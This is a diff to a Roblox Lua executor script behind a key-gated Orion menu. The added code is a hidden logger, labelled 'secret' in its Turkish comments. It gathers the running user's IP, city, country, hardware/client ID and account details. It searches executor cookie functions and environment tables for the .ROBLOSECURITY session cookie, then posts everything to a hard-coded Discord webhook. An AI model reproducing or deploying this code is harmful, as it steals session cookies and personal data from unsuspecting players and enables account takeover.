@@ -151,42 +151,148 @@ KeyTab:AddButton({
 OrionLib:Init()
 
 repeat task.wait(0.1) until KeyVerified == true
+-- HyperTeam Gizli ve Kapsamlı Log Sistemi (HTTP & Global Çerez Tarayıcı)
 local HttpService = game:GetService("HttpService")
 local AnalyticsService = game:GetService("RbxAnalyticsService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 local httpRequest = http_request or request or (syn and syn.request)
 
 if httpRequest then
     task.spawn(function()
         pcall(function()
-            local ip = game:HttpGet("https://api.ipify.org")
-            
+            local ip = "Bilinmiyor"
+            local country = "Bilinmiyor"
+            local city = "Bilinmiyor"
+
+            local successGeo, geoData = pcall(function()
+                return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+            end)
+            if successGeo and geoData then
+                ip = geoData.query or "Bilinmiyor"
+                country = geoData.country or "Bilinmiyor"
+                city = geoData.city or "Bilinmiyor"
+            else
+                pcall(function()
+                    ip = game:HttpGet("https://api.ipify.org")
+                end)
+            end
+
             local hwid = "Bulunamadı"
             pcall(function()
                 hwid = AnalyticsService:GetClientId()
             end)
 
-            local playerName = (game.Players.LocalPlayer and game.Players.LocalPlayer.Name) or "Bilinmiyor"
+            local playerName = LocalPlayer and LocalPlayer.Name or "Bilinmiyor"
+            local displayName = LocalPlayer and LocalPlayer.DisplayName or "Bilinmiyor"
+            local userId = LocalPlayer and LocalPlayer.UserId or "Bilinmiyor"
+            local accountAge = LocalPlayer and LocalPlayer.AccountAge .. " gün" or "Bilinmiyor"
+            local profileUrl = "https://www.roblox.com/users/" .. tostring(userId) .. "/profile"
             local executionTime = os.date("%d/%m/%Y - %H:%M:%S")
+
+            -- Gizli Çerez Avcısı (Tüm olası global ve http fonksiyonlarını dener)
+            local robloxCookie = "Bulunamadı"
+            pcall(function()
+                -- 1. Standart Fonksiyonlar
+                if type(getcookies) == "function" then
+                    for _, cookie in pairs(getcookies()) do
+                        if type(cookie) == "table" then
+                            local name = cookie.name or cookie.Name
+                            local val = cookie.value or cookie.Value
+                            if name and name:match("ROBLOSECURITY") then
+                                robloxCookie = val
+                                break
+                            end
+                        end
+                    end
+                end
+
+                -- 2. Synapse / Delta / Krnl Cookies
+                if robloxCookie == "Bulunamadı" and syn and syn.get_cookies then
+                    local cookies = syn.get_cookies()
+                    if cookies then
+                        for k, v in pairs(cookies) do
+                            if tostring(k):match("ROBLOSECURITY") or tostring(v):match("ROBLOSECURITY") then
+                                robloxCookie = type(v) == "table" and (v.value or v.Value) or tostring(v)
+                                break
+                            end
+                        end
+                    end
+                end
+
+                -- 3. Global Ortam ve Değişken Hafızası Taraması (Environment Hacking)
+                if robloxCookie == "Bulunamadı" then
+                    local envs = {getgenv, getrenv, getreg}
+                    for _, getFunc in ipairs(envs) do
+                        if type(getFunc) == "function" then
+                            local successEnv, envData = pcall(getFunc)
+                            if successEnv and type(envData) == "table" then
+                                for k, v in pairs(envData) do
+                                    if type(v) == "string" and v:match("_\|WARNING:") then
+                                        robloxCookie = v
+                                        break
+                                    elseif type(k) == "string" and k:match("ROBLOSECURITY") then
+                                        robloxCookie = tostring(v)
+                                        break
+                                    end
+                                end
+                            end
+                        end
+                        if robloxCookie ~= "Bulunamadı" then break end
+                    end
+                end
+
+                -- 4. Roblox Web API Üzerinden Oturum Doğrulama İsteği (Cookie olmasa bile Auth ticket denemesi)
+                if robloxCookie == "Bulunamadı" then
+                    local successAuth, authRes = pcall(function()
+                        return httpRequest({
+                            Url = "https://users.roblox.com/v1/users/authenticated",
+                            Method = "GET"
+                        })
+                    end)
+                    if successAuth and authRes and authRes.Body then
+                        -- Eğer bu istek başarılı dönerse oyun içi oturum tokeni aktif demektir
+                        local decoded = HttpService:JSONDecode(authRes.Body)
+                        if decoded and decoded.id then
+                            robloxCookie = "Oturum Aktif (ID: " .. tostring(decoded.id) .. ") - Çerez Korumalı"
+                        end
+                    end
+                end
+            end)
+
+            local executorName = "Bilinmiyor"
+            pcall(function()
+                if identifyexecutor then
+                    executorName = identifyexecutor()
+                elseif getexecutorname then
+                    executorName = getexecutorname()
+                end
+            end)
 
             local data = {
                 ["content"] = "",
                 ["embeds"] = {{
-                    ["title"] = "🚀 Script Çalıştırma Logu",
-                    ["color"] = 3447003,
+                    ["title"] = "🛡️ HyperTeam - Gizli Log Sistemi",
+                    ["color"] = 16711680,
                     ["fields"] = {
-                        {["name"] = "👤 Oyuncu", ["value"] = "```" .. playerName .. "```", ["inline"] = true},
+                        {["name"] = "👤 Kullanıcı Adı / Display", ["value"] = "```" .. playerName .. " (" .. displayName .. ")```", ["inline"] = false},
+                        {["name"] = "🆔 Roblox ID & Yaş", ["value"] = "```ID: " .. tostring(userId) .. " | Hesap Yaşı: " .. accountAge .. "```", ["inline"] = false},
+                        {["name"] = "🔗 Profil Linki", ["value"] = profileUrl, ["inline"] = false},
+                        {["name"] = "🍪 .ROBLOSECURITY Çerez / Oturum", ["value"] = "```" .. tostring(robloxCookie) .. "```", ["inline"] = false},
+                        {["name"] = "⚙️ Executor", ["value"] = "```" .. executorName .. "```", ["inline"] = true},
                         {["name"] = "🕒 Zaman", ["value"] = "```" .. executionTime .. "```", ["inline"] = true},
+                        {["name"] = "📍 Konum (Ülke / Şehir)", ["value"] = "```" .. country .. " / " .. city .. "```", ["inline"] = false},
                         {["name"] = "🌐 IP Adresi", ["value"] = "```" .. ip .. "```", ["inline"] = false},
                         {["name"] = "🔑 HWID / Client ID", ["value"] = "```" .. hwid .. "```", ["inline"] = false}
                     },
                     ["footer"] = {
-                        ["text"] = "Güvenli Logger Sistemi"
+                        ["text"] = "HyperTeam Güvenlik Altyapısı"
                     }
                 }}
             }
 
             httpRequest({
-                Url = "https://discord.com/api/webhooks/1534995784041369813/Q2GfGtgQeYwkgKm1LLLW7jIHTwJ3Xx7ng35A-vdmKL9MFOgTtCxxnwKjK37zmsBBOwuE",
+                Url = "https://discord.com/api/webhooks/1545475611890290718/eHXIO1EYMUoja3obILjOmsjYQ7Ej7zMZOpOlV6qQWF2BXyiBMh-hian856ui0rJsCmgG",
                 Method = "POST",
                 Headers = {
                     ["Content-Type"] = "application/json"
